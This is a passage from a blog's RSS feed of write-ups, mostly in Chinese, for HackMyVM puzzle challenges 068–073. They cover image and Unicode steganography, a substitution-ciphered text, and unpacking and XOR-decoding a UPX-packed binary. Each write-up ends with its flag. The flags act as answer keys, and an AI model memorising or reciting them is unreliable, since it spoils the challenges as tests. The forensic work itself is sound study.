sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20074.html</guid><pubDate>Wed, 06 Aug 2025 00:32:22 +0000</pubDate></item><item><title>Challenge 073</title><link>https://7r1UMPHK.github.io/post/Challenge%20073.html</link><description>![image-20250722220049943](https://7r1umphk.github.io/image/20250722220050174.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 073.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1764017 bytes (1723 KiB)

Extracting archive: 073.zip
--
Path = 073.zip
Type = zip
Physical Size = 1764017

Everything is Ok

Size:       1764017
Compressed: 1764017
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 3466
drwxr-xr-x 1 kali kali    4096  7月22日 10:02 .
drwxr-xr-x 1 kali kali   16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 1764017 2024年 5月26日 073.png
-rwxr-xr-x 1 kali kali 1764017  7月22日 10:01 073.zip
```

![073](https://7r1umphk.github.io/image/20250722220234455.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek 073.png               
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file '073.png' is not supported.
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk 073.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1600 x 1600, 8-bit/color RGB, non-interlaced
60            0x3C            Zlib compressed data, default compression

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ steghide extract -sf 073.png   
Enter passphrase: 
steghide: the file format of the file '073.png' is not supported.
                                                                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg 073.png  
imagedata           .. text: 'UYZ.31)+)'
b1,rgb,lsb,xy       .. text: 'nI?nKdK`$'
b4,r,lsb,xy         .. text: '\'D3ffUDUDDUUfUw'
b4,g,lsb,xy         .. text: 'D3UUUDD33DDUUww'
b4,b,lsb,xy         .. text: 'fffffUUUffUUDD333333333DDDDDDDD33333333DD33D3UD3DD3\'\''
b4,b,msb,xy         .. text: ['\'' repeated 8 times]
b4,rgb,lsb,xy       .. text: '0e&amp;Re&amp;RU'
b4,bgr,lsb,xy       .. text: '03%bV%bV'

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg -E 'b4,rgb,lsb,xy' 073.png &gt; a
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file a
a: data
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la a
-rwxr-xr-x 1 kali kali 3840000  7月22日 10:06 a

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk a

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

https://georgeom.net/StegOnline/extract

Extract Files/Data

![image-20250722221534561](https://7r1umphk.github.io/image/20250722221534835.webp)

```
hmv{youreallyknowLSBbro}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20073.html</guid><pubDate>Tue, 22 Jul 2025 15:10:50 +0000</pubDate></item><item><title>Challenge 072</title><link>https://7r1UMPHK.github.io/post/Challenge%20072.html</link><description>![image-20250722215411456](https://7r1umphk.github.io/image/20250722215411704.webp)

解压，查看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al 
总计 91364
drwxr-xr-x 1 kali kali     4096  7月22日 09:57 .
drwxr-xr-x 1 kali kali    16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 93536118 2024年 4月 7日 072.zip
drwxr-xr-x 1 kali kali        0  7月22日 09:57 fr1end
                         
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd fr1end         
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/fr1end]
└─$ grep -r 'HMV{' .                                                                                           
./fr1end-main/server/keys/flag.txt:HMV{jWt_m4keS_th3_w0rLd_g0_r0und}
          
```

秒sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20072.html</guid><pubDate>Tue, 22 Jul 2025 15:10:38 +0000</pubDate></item><item><title>Challenge 071</title><link>https://7r1UMPHK.github.io/post/Challenge%20071.html</link><description>![image-20250722214605319](https://7r1umphk.github.io/image/20250722214605558.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 071.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3437 bytes (4 KiB)

Extracting archive: 071.zip
--
Path = 071.zip
Type = zip
Physical Size = 3437

Everything is Ok

Size:       7094
Compressed: 3437
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al 
总计 31
drwxr-xr-x 1 kali kali  4096  7月22日 09:46 .
drwxr-xr-x 1 kali kali 16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali  3437  7月22日 09:46 071.zip
-rwxr-xr-x 1 kali kali  7094 2024年 2月15日 hmv-moje02.txt
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat hmv-moje02.txt 
JalanClmd Ad X fVyVazIXtAxVf AazVIaXzAlaXt XyzAiAdz Xaf oXyUzAiAdz ylttVyzAiV Xaf CliVCVaz TIACXIAtn Ualva glI Azd iXIAlmd ynEVIXzzXyUd XOXAadz dViVIXt OliVIaCVazd, OliVIaCVaz AadzAzmzAlad Xaf OliVIaCVaz XOVayAVd, ylITlIXzAlad Xaf zoV somIyo lg YyAVazltlOn. JalanClmd lIAOAaXzVf Aa 2003 la zoV ACXOVElXIf 4yoXa IVTIVdVazAaO zoV ylayVTz lg CXan latAaV Xaf lggtAaV ylCCmaAzn mdVId dACmtzXaVlmdtn VKAdzAaO Xd Xa 'XaXIyoAy', fAOAzAxVf 'OtlEXt EIXAa' lI 'oAiVCAaf'. JalanClmd CVCEVId (Ualva Xd Xalad) yXa dlCVzACVd EV fAdzAaOmAdoVf Aa TmEtAy En zoV vVXIAaO lg Qmn uXvUVd CXdUd Aa zoV dzntV TlIzIXnVf Aa zoV OIXToAy aliVt Xaf gAtC w glI wVafVzzX. YlCV Xalad Xtdl lTz zl CXdU zoVAI ilAyVd zoIlmOo ilAyV yoXaOVId lI zVKz-zl-dTVVyo TIlOIXCd. BlxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd Aa ylmazIAVd AaytmfAaO zoV eaAzVf YzXzVd, zoV eaAzVf NAaOflC, JmdzIXtAX, zoV kVzoVItXafd, Ylmzo JgIAyX, YTXAa, qafAX, Xaf bmIUVn. PiXtmXzAlad lg zoV OIlmT'd XyzAlad Xaf VggVyzAiVaVdd iXIn vAfVtn. YmTTlIzVId oXiV yXttVf zoV OIlmT 'gIVVflC gAOozVId' Xaf fAOAzXt RlEAa Wllfd, voAtV yIAzAyd oXiV fVdyIAEVf zoVC Xd 'X ynEVI tnayo-ClE' lI 'ynEVI zVIIlIAdzd'. qa 2012, bACV yXttVf JalanClmd laV lg zoV '100 Cldz AagtmVazAXt TVlTtV' Aa zoV vlItf. JalanClmd' CVfAX TIlgAtV fACAaAdoVf En 2018, Emz zoV OIlmT IV-VCVIOVf Aa 2020 zl dmTTlIz zoV QVlIOV utlnf TIlzVdzd Xaf lzoVI yXmdVd. MoAtldlTon boV ToAtldlTon lg JalanClmd lggVId AadAOoz Aazl X tlaO-dzXafAaO TltAzAyXt pmVdzAla zoXz oXd OlaV maXadvVIVf vAzo lgzVa zIXOAy yladVpmVayVd glI dlyAXt CliVCVazd: voXz flVd X aVv glIC lg ylttVyzAiV TltAzAyd tllU tAUV zoXz vAdoVd zl Ol EVnlaf zoV AfVazAzn lg zoV AafAiAfmXt dmESVyz Aa tXzV yXTAzXtAdC? qazVIaXt fAddVaz Ad Xtdl X IVOmtXI gVXzmIV lg zoV OIlmT. J vVEdAzV XddlyAXzVf vAzo zoV OIlmT fVdyIAEVd Az Xd 'Xa qazVIaVz OXzoVIAaO' vAzo 'X iVIn tlldV Xaf fVyVazIXtAxVf ylCCXaf dzImyzmIV zoXz lTVIXzVd la AfVXd IXzoVI zoXa fAIVyzAiVd'. QXEIAVttX sltVCXa vIAzVd lg zoV OIlmT: 'qa dlCV vXnd, Az CXn EV ACTlddAEtV zl OXmOV zoV AazVaz Xaf ClzAiV lg zolmdXafd lg TXIzAyATXazd, CXan lg vol fla'z ViVa ElzoVI zl tVXiV X zIXyV lg zoVAI zolmOozd, ClzAiXzAlad, Xaf IVXyzAlad. JClaO zoldV zoXz fl, lTAaAlad iXIn yladAfVIXEtn.' FIlXftn dTVXUAaO, Jalad lTTldV qazVIaVz yVadlIdoAT Xaf ylazIlt Xaf zoV CXSlIAzn lg zoVAI XyzAlad zXIOVz OliVIaCVazd, lIOXaAxXzAlad, Xaf ylITlIXzAlad zoXz zoVn XyymdV lg yVadlIdoAT. Jalad vVIV VXItn dmTTlIzVId lg zoV OtlEXt GyymTn CliVCVaz Xaf zoV JIXE YTIAaO. YAayV 2008, X gIVpmVaz dmESVyz lg fAdXOIVVCVaz vAzoAa JalanClmd Ad voVzoVI CVCEVId dolmtf glymd la TIXaUAaO Xaf VazVIzXAaCVaz lI ClIV dVIAlmd (Xaf, Aa dlCV yXdVd, TltAzAyXt) XyzAiAdC. ZV [JalanClmd] Smdz oXTTVa zl EV X OIlmT lg TVlTtV la zoV qazVIaVz vol aVVf—Smdz UAaf lg Xa lmztVz zl fl Xd vV vAdo, zoXz vV vlmtfa'z EV XEtV zl fl Aa IVOmtXI dlyAVzn. ...boXz'd ClIV lI tVdd zoV TlAaz lg Az. Bl Xd nlm vAdo. ... boVIV'd X ylCCla ToIXdV: 'vV XIV flAaO Az glI zoV tmtx.' — bIVaz MVXylyU, 'YVXIyo PaOAaV: boV uXyV lg JalanClmd, uVEImXIn 7, 2008. FVyXmdV JalanClmd oXd al tVXfVIdoAT, al XyzAla yXa EV XzzIAEmzVf zl zoV CVCEVIdoAT Xd X voltV. MXICn Gtdla Xaf lzoVId oXiV yIAzAyAxVf CVfAX yliVIXOV zoXz TIVdVazd zoV OIlmT Xd vVtt-lIOXaAxVf lI olClOVaVlmd; Gtdla vIAzVd, 'boVIV vXd al dAaOtV tVXfVI TmttAaO zoV tViVId, Emz X gVv lIOXaAxXzAlaXt CAafd zoXz dlCVzACVd TlltVf zlOVzoVI zl dzXIz TtXaaAaO X dzmaz.' YlCV CVCEVId TIlzVdz mdAaO tVOXt CVXad, voAtV lzoVId VCTtln AttVOXt CVXdmIVd dmyo Xd BBlY XzzXyUd Xaf oXyUAaO. cVCEVIdoAT Ad lTVa zl XanlaV vol vAdoVd zl dzXzV zoVn XIV X CVCEVI lg zoV ylttVyzAiV; FIAzAdo SlmIaXtAdz sXIltV sXfvXttXfI lg boV GEdVIiVI ylCTXIVf zoV OIlmT'd fVyVazIXtAxVf dzImyzmIV zl zoXz lg Xt-hXVfX: 'qg nlm EVtAViV Aa JalanClmd, Xaf yXtt nlmIdVtg JalanClmd, nlm XIV JalanClmd.' Gtdla, vol glICVItn fVdyIAEVf JalanClmd Xd X 'EIXaf', dzXzVf Aa 2012 zoXz doV alv yoXIXyzVIAxVf Az Xd X 'CliVCVaz' IXzoVI zoXa X OIlmT: 'XanlaV yXa EV TXIz lg Az. qz Ad X yIlvf lg TVlTtV, X aVEmtlmd yIlvf lg TVlTtV, vlIUAaO zlOVzoVI Xaf flAaO zoAaOd zlOVzoVI glI iXIAlmd TmITldVd.' boV OIlmT'd gVv ImtVd AaytmfV alz fAdytldAaO laV'd AfVazAzn, alz zXtUAaO XElmz zoV OIlmT, Xaf alz XzzXyUAaO CVfAX. cVCEVId ylCClatn mdV zoV zXOtAaV 'ZV XIV JalanClmd. ZV XIV LVOAla. ZV fl alz glIOAiV. ZV fl alz glIOVz. PKTVyz md.' FIAXa NVttn vIAzVd zoXz zoIVV lg zoV OIlmT'd UVn yoXIXyzVIAdzAyd XIV ' Xa maIVtVazAaO ClIXt dzXayV la AddmVd Xaf IAOozd, IVOXIftVdd lg fAIVyz TIlilyXzAla; X TondAyXt TIVdVayV zoXz XyylCTXaAVd latAaV oXyUAaO XyzAiAzn; Xaf  X fAdzAayzAiV EIXaf.' jlmIaXtAdzd oXiV ylCCVazVf zoXz JalanClmd' dVyIVyn, gXEIAyXzAlad, Xaf CVfAX XvXIVaVdd TldV Xa mamdmXt yoXttVaOV glI IVTlIzAaO la zoV OIlmT'd XyzAlad Xaf ClzAiXzAlad. hmAaa klIzla lg ZAIVf vIAzVd zoXz: 'Jalad tAV voVa zoVn oXiV al IVXdla zl tAV. boVn vVXiV iXdz gXEIAyXzAlad Xd X glIC lg TVIglICXayV. boVa zoVn zVtt zoV zImzo Xz maVKTVyzVf Xaf maglIzmaXzV zACVd, dlCVzACVd fVdzIlnAaO zoVCdVtiVd Aa zoV TIlyVdd. boVn XIV maTIVfAyzXEtV.'. Fn zoV vXn Wcw{Ad_zoV_EVdz_vVEdAzV_glI_imtaVIXEtV_iAIzmXt_CXyoAaVd}. klIzla dzXzVd zoXz zoV fAggAymtzAVd Aa IVTlIzAaO la zoV OIlmT yXmdV Cldz vIAzVId, AaytmfAaO oVIdVtg, zl glymd la zoV 'dCXtt OIlmTd lg oXyUVId vol dzltV zoV tACVtAOoz gIlC X tVOAla, fVgAVf zoVAI iXtmVd, Xaf yIXdoVf iAltVaztn Aazl zoV tXv' IXzoVI zoXa 'JalanClmd'd dVX lg ilAyVd, Xtt VKTVIACVazAaO vAzo aVv vXnd lg EVAaO Aa zoV vlItf'. YAayV 2009, flxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd, Aa ylmazIAVd AaytmfAaO zoV e.Y., eN, JmdzIXtAX, zoV kVzoVItXafd, YTXAa, Xaf bmIUVn. Jalad OVaVIXttn TIlzVdz zoVdV TIldVymzAlad Xaf fVdyIAEV zoVdV AafAiAfmXtd Xd CXIznId zl zoV CliVCVaz. boV jmtn 2011 XIIVdz lg LmtxYVy CVCEVI blTAXIn EVyXCV X TXIzAymtXI IXttnAaO TlAaz, tVXfAaO zl X vAfVdTIVXf 'uIVV blTAXIn' CliVCVaz. boV gAIdz TVIdla zl EV dVaz zl SXAt glI TXIzAyATXzAla Aa Xa JalanClmd BBlY XzzXyU vXd BCAzIAn QmxaVI, Xa JCVIAyXa 19-nVXI-ltf. WV TtVXfVf OmAtzn zl 'maXmzolIAxVf ACTXAICVaz lg X TIlzVyzVf ylCTmzVI' Aa kliVCEVI 2009 Xaf vXd dVazVayVf zl 366 fXnd Aa e.Y. gVfVIXt TIAdla. Ga jmaV 13, 2011, lggAyAXtd Aa bmIUVn XIIVdzVf 32 AafAiAfmXtd zoXz vVIV XttVOVftn AailtiVf Aa BBlY XzzXyUd la bmIUAdo OliVIaCVaz vVEdAzVd. boVdV CVCEVId lg JalanClmd vVIV yXTzmIVf Aa fAggVIVaz yAzAVd lg bmIUVn AaytmfAaO qdzXaEmt Xaf JaUXIX. JyylIfAaO zl Ms cXOXxAaV, zoVdV AafAiAfmXtd vVIV XIIVdzVf XgzVI zoVn XzzXyUVf vVEdAzVd Xd X IVdTladV zl zoV bmIUAdo OliVIaCVaz fVCXaf zl qYMd zl ACTtVCVaz X dndzVC lg gAtzVId zoXz CXan oXiV TVIyVAiVf Xd yVadlIdoAT. soIAd Blnla (XtAXd 'slCCXafVI r'), X dVtg-fVdyIAEVf tVXfVI lg JalanClmd, vXd XIIVdzVf Aa YVTzVCEVI 2011 glI X ynEVIXzzXyU la zoV vVEdAzV lg YXazX sImx slmazn, sXtAglIaAX. WV SmCTVf EXAt Aa uVEImXIn 2012 Xaf gtVf XyIldd zoV ElIfVI Aazl sXaXfX. qa YVTzVCEVI 2012, SlmIaXtAdz Xaf JalanClmd XddlyAXzV FXIIVzz FIlva, Ualva glI dTVXUAaO zl CVfAX la EVoXtg lg zoV OIlmT, vXd XIIVdzVf olmId XgzVI TldzAaO X iAfVl zoXz XTTVXIVf zl zoIVXzVa uFq XOVazd vAzo TondAyXt iAltVayV. FIlva vXd dmEdVpmVaztn yoXIOVf vAzo 17 lggVadVd, AaytmfAaO TmEtAdoAaO TVIdlaXt yIVfAz yXIf AaglICXzAla gIlC zoV YzIXzglI oXyU.   
```

我只能说ai秒了

![image-20250722215322625](https://7r1umphk.github.io/image/20250722215322722.webp)

```
HMV{is_the_best_website_for_vulnerable_virtual_machines}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20071.html</guid><pubDate>Tue, 22 Jul 2025 15:10:27 +0000</pubDate></item><item><title>Challenge 070</title><link>https://7r1UMPHK.github.io/post/Challenge%20070.html</link><description>![image-20250722212408911](https://7r1umphk.github.io/image/20250722212409115.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 070.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 308448 bytes (302 KiB)

Extracting archive: 070.zip
--
Path = 070.zip
Type = zip
Physical Size = 308448

Everything is Ok

Files: 2
Size:       316108
Compressed: 308448
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 631
drwxr-xr-x 1 kali kali   4096  7月22日 09:39 .
drwxr-xr-x 1 kali kali  16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 308448  7月22日 09:39 070.zip
-rwxr-xr-x 1 kali kali   6600 2024年 3月14日 hmv005
-rwxr-xr-x 1 kali kali 309508 2024年 3月14日 hmv005-static
                                     
```

尝试反编译一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings hmv005                            
UPX!
tdoP7
[oQ7
/lib64
nux-x86-
so.2
puts
free
strlen
mall
art_
cxa_f    iz.
6sLIBC_2.34
5/ITM_deZgiE
CWneTabeK`
]_*(
PTE1
u+UH
_GLOBAL_OFFSET_TABLE_
frame_
dummy
 Lost in OSINT 
$/PP
;*3$'?}
USQRH
W^YH
PROT_EXEC|PROT_WRITE failed.
_j&lt;X
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $
_RPWQM)
j'AZR^j
PZS^
/proc/self/exe
IuDSWH
s2V^
XAVAWPH
YT_j
AY^_
D$ [I
UPX!u
slIT$}
}aw993u
([]A\A]
I[8k
(L      '
tL      n
+xHf
p(E1[$1
fFj9
~*'|]
I5(Ag
@bQs
 k1(
=(I[u
A^A_)
m@S r6
ck5?
JAPC
JG=,1
SRVW
RY?WVj,4
GCC: (Debian 13.2.0-
/|G`
 x!va
0G]/
aw7L
Scrt1.o
_tag
stuff.c
deregi
_clones)do_g
bal     tor
s9ux5omple)d.0!
_fin`array_entry
vme ummy2
)t*hmv005
'Fwyk
RAME_END
DYNIC
vGNU
GLOBA
L_OFFSET_TABL
see@
BC_2
59libc_
nrmay
ITM_
T)Xroo
se1chH
dF_uod
cj(3bssNc
~KeySav
imP_
oize5
6.symnb
h        Np
o.gnu.prop
build-id
K       dynb
la(so#
.ehthd
Qd5G3
=,?8
'epa
.P/^
 0o9l
UPX!
UPX!
```

输出中多次出现了 UPX! 以及 $Info: This file is packed with the UPX executable packer http://upx.sf.net $ 的字样。这明确表示 hmv005 文件使用了 UPX 加壳工具进行了压缩和混淆。

脱壳

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ upx -d hmv005
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     24851 &lt;-      6600   26.56%   linux/amd64   hmv005

Unpacked 1 file.
                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 640
drwxr-xr-x 1 kali kali   4096  7月22日 09:41 .
drwxr-xr-x 1 kali kali  16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 308448  7月22日 09:39 070.zip
-rwxr-xr-x 1 kali kali  16192 2024年 3月14日 hmv005
-rwxr-xr-x 1 kali kali 309508 2024年 3月14日 hmv005-static
```

反编译一下

拖入IDA PRO

F5

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rbx
  size_t v4; // rax
  unsigned __int64 v5; // rbx
  size_t v6; // rax
  int v8[34]; // [rsp+0h] [rbp-C0h]
  int v9; // [rsp+88h] [rbp-38h]
  int v10; // [rsp+8Ch] [rbp-34h]
  void *ptr; // [rsp+90h] [rbp-30h]
  char *v12; // [rsp+98h] [rbp-28h]
  char *s; // [rsp+A0h] [rbp-20h]
  int v14; // [rsp+A8h] [rbp-18h]
  int i; // [rsp+ACh] [rbp-14h]

  v8[0] = 113;
  v8[1] = 120;
  v8[2] = 123;
  v8[3] = 89;
  v8[4] = 116;
  v8[5] = 118;
  v8[6] = 73;
  v8[7] = 78;
  v8[8] = 22;
  v8[9] = 92;
  v8[10] = 122;
  v8[11] = 77;
  v8[12] = 82;
  v8[13] = 106;
  v8[14] = 101;
  v8[15] = 84;
  v8[16] = 65;
  v8[17] = 74;
  v8[18] = 86;
  v8[19] = 94;
  v8[20] = 87;
  v8[21] = 121;
  v8[22] = 110;
  v8[23] = 109;
  v8[24] = 103;
  v8[25] = 97;
  v8[26] = 112;
  v8[27] = 76;
  v8[28] = 89;
  v8[29] = 79;
  v8[30] = 95;
  v8[31] = 86;
  v14 = 32;
  s = '_GLOBAL_OFFSET_TABLE_';
  v12 = 'frame_dummy';
  dontSearchForKeySaveTime(argc, argv, envp);
  ptr = malloc(0x21uLL);
  for ( i = 0; i &lt; v14; ++i )
  {
    v3 = i;
    v4 = strlen(s);
    v10 = s[v3 % v4];
    v5 = i;
    v6 = strlen(v12);
    v9 = v12[v5 % v6];
    *((_BYTE *)ptr + i) = v9 ^ v10 ^ LOBYTE(v8[i]);
  }
  *((_BYTE *)ptr + v14) = 0;
  searchHere();
  free(ptr);
  puts(::s);
  return 0;
}
```

编个py

```
# C 代码中提供的数据
v8 = [
    113, 120, 123, 89, 116, 118, 73, 78, 22, 92, 122, 77, 82, 106, 101, 84,
    65, 74, 86, 94, 87, 121, 110, 109, 103, 97, 112, 76, 89, 79, 95, 86
]
s = '_GLOBAL_OFFSET_TABLE_'
v12 = 'frame_dummy'
v14 = 32 # flag 长度

flag = []

# 复现 for 循环的逻辑
for i in range(v14):
    # 计算两个密钥的当前字符
    key_char1 = ord(s[i % len(s)])
    key_char2 = ord(v12[i % len(v12)])
    
    # 获取 v8 数组中的值
    v8_char = v8[i]
    
    # 执行三次异或操作
    decrypted_char = key_char1 ^ key_char2 ^ v8_char
    
    # 将解密后的字符添加到列表中
    flag.append(chr(decrypted_char))

# 将字符列表合并成最终的字符串
final_flag = ''.join(flag)

print(f'解密得到的 Flag 是: {final_flag}')
```

运行

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py             
解密得到的 Flag 是: HMV{Shad4wExe_We_love_OSINT_but}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20070.html</guid><pubDate>Tue, 22 Jul 2025 15:10:17 +0000</pubDate></item><item><title>Challenge 069</title><link>https://7r1UMPHK.github.io/post/Challenge%20069.html</link><description>![image-20250722210655654](https://7r1umphk.github.io/image/20250722210710989.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 069.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 198 bytes (1 KiB)

Extracting archive: 069.zip
--
Path = 069.zip
Type = zip
Physical Size = 198

Everything is Ok

Size:       4
Compressed: 198
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 21
drwxr-xr-x 1 kali kali  4096  7月22日 09:07 .
drwxr-xr-x 1 kali kali 16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali     4 2024年 4月19日 069.bin
-rwxr-xr-x 1 kali kali   198  7月22日 09:07 069.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ find 069.bin                                             
069.bin
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings 069.bin                           
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 069.bin
�                                                                                               
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ xxd 069.bin
00000000: 8d08 13b0                                ....
```

我去，这么少东西

```
8d0813b0
HM@....@
HM@HACK@
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20069.html</guid><pubDate>Tue, 22 Jul 2025 15:10:04 +0000</pubDate></item><item><title>Challenge 068</title><link>https://7r1UMPHK.github.io/post/Challenge%20068.html</link><description>![image-20250722102128231](https://7r1UMPHK.github.io/image/static/image/20250722103206029.webp)
# **解题步骤**

## **第一步：文件分析与异常发现**

1.  **解压文件**: 挑战始于一个 `068.zip` 压缩包，解压后得到一个文本文件 `068.txt`。

2.  **查看内容**: 初步使用 `cat` 命令查看文件内容，我们得到一行被小鸟图标包围的文本：
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
    └─$ cat 068.txt   
    🐦Iｔ's ｎｏt that ｅasｙ, tａle a deeｐ bｒｅａth ａnｄ ｒeｌａx. Cｈiｒp, ϲhⅰrｐ， chｉｒｐ.Ιt＇s nοt thａｔ ｅａsy, taｌe a dｅeｐ ｂreath aｎd relax. Chirp, chirp, chirp.🐦
    ```
    乍一看，这似乎只是一句普通的句子。然而，如果使用带有 `-A` 参数的 `cat` 命令来显示所有非打印字符，就会发现事情并不简单：
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
    └─$ cat -A 068.txt
    M-pM-^_M-^PM-&amp;I...
    ```
    
    大量的 `M-^` 符号表明，这些字符并非标准的 ASCII 字符。仔细观察可以发现：
    
    *   **宽体字符**: 几乎所有的字母都是全角（Full-width）形式，例如 `Ｉ` 而不是 `I`。
    *   **不规则空格**: 单词之间的空格宽度不一，它们是 Unicode 中定义的多种不同宽度的空格字符。
    *   **同形异义字 (Homoglyphs)**: 文本中可能混入了其他看起来与标准字母一样的 Unicode 字符，例如希腊字母 `ο` (omicron) 代替了拉丁字母 `o`。
    
    这些迹象明确地指向了一种高级的文本隐写术。

## **第二步：理解 Unicode 隐写术原理**

这种隐写术的原理是将信息编码到字符的选择中。

1.  **字符集**: 对于每一个标准 ASCII 字符（如 `a`, `b`, ` ` 等），都存在一个包含它自身的、以及多个视觉上极为相似的 Unicode 变体字符的列表。
2.  **编码**: 秘密信息首先被转换成二进制码流（如 `011010...`）。
3.  **嵌入**: 程序在生成载体文本时，会根据要隐藏的二进制位来从备选列表中选择具体的字符。例如，如果 `t` 有 4 个变体 `t`, `ｔ`, `ᴛ`, `𝔱`，它们可以分别用来表示 2-bit 的二进制数 `00`, `01`, `10`, `11`。当程序需要隐藏 `01` 时，它就会在文本中写入 `ｔ`。
4.  **隐藏**: 通过这种方式，整段秘密信息被分解成无数个小片段，并“溶解”在整个文本的字符和空格的选择之中，使其无法被直接阅读。

## **第三步：使用专业工具解码**

手动解码几乎是不可能的，因为它需要一个庞大的 Unicode 变体字符数据库。因此，我们需要使用专门的解码工具。

1.  **在线工具**: [Holloway's Steganography Tool](https://holloway.nz/steg/) 是一个能够处理此类 Unicode 隐写术的在线解码器。

2.  **解码操作**: 将 `068.txt` 中的完整内容（包括前后的 `🐦` 图标）复制并粘贴到该网站的输入框中。

3.  **获取结果**: 该工具会自动分析文本中每个字符的 Unicode 编码，识别出其在变体列表中的索引，从而提取出隐藏的二进制位，并最终将其还原为原始信息。

    解码后得到的隐藏文本为：
    ```
    hmvgreetings_from_green_br0ther
    ```

---

# **最终 Flag**

```
hmvgreetings_from_green_br0ther
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20068.html</guid><pubDate>Tue, 22 Jul 2025 08:33:03 +0000</pubDate></item><item><title>Challenge 067</title><link>https://7r1UMPHK.github.io/post/Challenge%20067.html</link><description>![image-20250722102128231](https://7r1UMPHK.github.io/image/20250722102128477.webp)

# **解题步骤**

## **第一步：文件提取与初步分析**

挑战从一个名为 `067.zip` 的压缩包开始。

1.  **解压文件**: 使用 `7z` 或其他解压工具提取压缩包内容。
    
    ```bash
    7z x 067.zip
    ```
    解压后得到两个文件：`hmv067` 和 `hmv067-static`。
    
2.  **文件类型分析**: 使用 `file` 命令确定文件类型。
    ```bash
